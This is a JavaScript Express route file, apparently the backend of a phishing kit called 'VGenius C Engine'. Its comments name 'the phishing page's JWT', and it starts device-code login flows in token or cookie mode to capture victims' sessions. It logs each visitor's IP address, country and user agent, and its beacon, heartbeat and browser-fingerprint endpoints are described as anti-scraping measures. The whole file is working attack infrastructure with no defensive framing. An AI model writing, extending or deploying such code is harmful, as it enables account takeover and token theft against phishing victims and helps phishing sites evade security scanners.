/**
 * VGenius C Engine – Device Proxy Routes
 * Handles /api/device/start, /api/device/status/:job_id, and /beacon
 */

const express = require('express');
const router = express.Router();
const deviceProxy = require('../services/deviceproxy');
const db = require('../database/connection');

/**
 * POST /api/device/start
 * Start a new device code flow
 * Body: { mode: "token" | "cookie" }
 * Headers: X-Auth-Mode, X-VG-JWT (the phishing page's JWT)
 */
router.post('/start', async (req, res) => {
	try {
	const mode = req.body.mode || req.headers['x-auth-mode'] || 'cookie';
	const jwtToken = req.body.jwt_token || req.headers['x-vg-jwt'] || req.query.token;

	if (!jwtToken) {
		return res.status(400).json({ error: 'JWT token required' });
	}

	// Initialize variables BEFORE try block so they're available throughout
	let user_id = null;
	let link_id = null;
	let ipAddress = req.ip || req.connection.remoteAddress || 'unknown';
	let userAgent = req.headers['user-agent'] || 'unknown';

	// Log visitor when device code is generated (only if not already logged by beacon)
	try {
		const jwt = require('jsonwebtoken');
		const config = require('../config/env');
		const decoded = jwt.verify(jwtToken, config.JWT_SECRET);
		user_id = decoded.user_id;
		link_id = decoded.link_id;

		// Only log if not already logged by beacon endpoint to avoid duplicates
		let country = 'Unknown';
		try {
			const cfCountry = req.headers['cf-ipcountry'];
			if (cfCountry) country = cfCountry;
		} catch (e) {
			country = 'Unknown';
		}

		// Check if visitor already exists to avoid duplicates
		const [existing] = await db.query(
			'SELECT id FROM visitors WHERE user_id = ? AND link_id = ? AND ip_address = ? AND status = ?',
			[user_id, link_id, ipAddress, 'waiting']
		);

		if (existing.length === 0) {
			await db.query(
				'INSERT INTO visitors (user_id, link_id, ip_address, country, user_agent, status, created_at) VALUES (?, ?, ?, ?, ?, ?, NOW())',
				[user_id, link_id, ipAddress, country, userAgent, 'waiting']
			);
			console.log(`[Device] Visitor logged - Link ID: ${link_id}, User ID: ${user_id}, IP: ${ipAddress}`);
		}
	} catch (jwtErr) {
		console.error('[Device] Visitor logging failed:', jwtErr.message);
		// Continue with device flow even if visitor logging fails
	}

	const apiBaseUrl = `${req.protocol}://${req.get('host')}`;
	const result = await deviceProxy.startDeviceFlow(mode, jwtToken, apiBaseUrl, {
		ip: ipAddress,
		userAgent: userAgent
	});

	res.json(result);
} catch (err) {
	console.error('[Device] Start error:', err.message);
	res.status(500).json({ error: 'Failed to start device flow', message: err.message });
}
});

/**
 * GET /api/device/status/:job_id
 * Poll for device code flow status
 */
router.get('/status/:job_id', async (req, res) => {
	try {
		const { job_id } = req.params;
		const result = deviceProxy.getJobStatus(job_id);
		res.json(result);
	} catch (err) {
		console.error('[Device] Status error:', err.message);
		res.status(500).json({ error: 'Failed to get status' });
	}
});

// -------------------------------------------
// Beacon endpoint - tracks page visits
// -------------------------------------------
router.post('/beacon', async (req, res) => {
	try {
		const { jwt_token } = req.body;

		if (!jwt_token) {
			return res.status(400).json({ error: 'JWT token required' });
		}

		// Verify JWT and log the beacon
		const jwt = require('jsonwebtoken');
		const config = require('../config/env');

		try {
			const decoded = jwt.verify(jwt_token, config.JWT_SECRET);

			// Insert visitor record
			const ipAddress = req.ip || req.connection.remoteAddress || 'unknown';
			const userAgent = req.headers['user-agent'] || 'unknown';

			// Simple country detection (you can enhance this with GeoIP)
			let country = 'Unknown';
			try {
				// Try to get country from Cloudflare header or fallback
				const cfCountry = req.headers['cf-ipcountry'];
				if (cfCountry) country = cfCountry;
			} catch (e) {
				country = 'Unknown';
			}

			await db.query(
				'INSERT INTO visitors (user_id, link_id, ip_address, country, user_agent, status, created_at) VALUES (?, ?, ?, ?, ?, ?, NOW())',
				[decoded.user_id, decoded.link_id, ipAddress, country, userAgent, 'waiting']
			);

			console.log(`[Beacon] Visitor logged - Link ID: ${decoded.link_id}, User ID: ${decoded.user_id}, IP: ${ipAddress}`);

			res.json({ success: true, message: 'Beacon received' });
		} catch (jwtErr) {
			return res.status(401).json({ error: 'Invalid JWT token' });
		}
	} catch (err) {
		console.error('[Beacon] Error:', err.message);
		res.status(500).json({ error: 'Beacon failed' });
	}
});
	
	// Heartbeat endpoint - verifies page is still alive (anti-scraping)
	router.post('/heartbeat', async (req, res) => {
	  try {
	    const { jwt } = req.body;
	    if (!jwt) {
	      return res.status(400).json({ error: 'JWT token required' });
	    }
	    
	    const jwtLib = require('jsonwebtoken');
	    const config = require('../config/env');
	    let decoded;
	    try {
	      decoded = jwtLib.verify(jwt, config.JWT_SECRET);
	    } catch (e) {
	      return res.status(401).json({ error: 'Invalid or expired JWT' });
	    }
	    
	    // Update last heartbeat timestamp in visitors table
	    const db = require('../database/connection');
	    await db.query(
	      'UPDATE visitors SET last_heartbeat = NOW() WHERE link_id = ? AND jwt_token = ?',
	      [decoded.link_id, jwt]
	    );
	    
	    console.log(`[Heartbeat] Link ${decoded.link_id} heartbeat received`);
	    res.json({ success: true, message: 'Heartbeat received' });
	  } catch (err) {
	    console.error('[Heartbeat] Error:', err.message);
	    res.status(500).json({ error: 'Heartbeat failed' });
	  }
	});
	
	// Fingerprint endpoint - receives browser fingerprint from anti-scraping
	router.post('/fp', async (req, res) => {
	  try {
	    const { fp, jwt } = req.body;
	    if (!fp || !jwt) {
	      return res.status(400).json({ error: 'Fingerprint and JWT required' });
	    }
	    
	    const jwtLib = require('jsonwebtoken');
	    const config = require('../config/env');
	    let decoded;
	    try {
	      decoded = jwtLib.verify(jwt, config.JWT_SECRET);
	    } catch (e) {
	      return res.status(401).json({ error: 'Invalid or expired JWT' });
	    }
	    
	    const db = require('../database/connection');
	    await db.query(
	      'UPDATE visitors SET fingerprint = ? WHERE link_id = ? AND jwt_token = ?',
	      [fp, decoded.link_id, jwt]
	    );
	    
	    console.log(`[Fingerprint] Link ${decoded.link_id} fingerprint received`);
	    res.json({ success: true, message: 'Fingerprint received' });
	  } catch (err) {
	    console.error('[Fingerprint] Error:', err.message);
	    res.status(500).json({ error: 'Fingerprint failed' });
	  }
	});

module.exports = router;
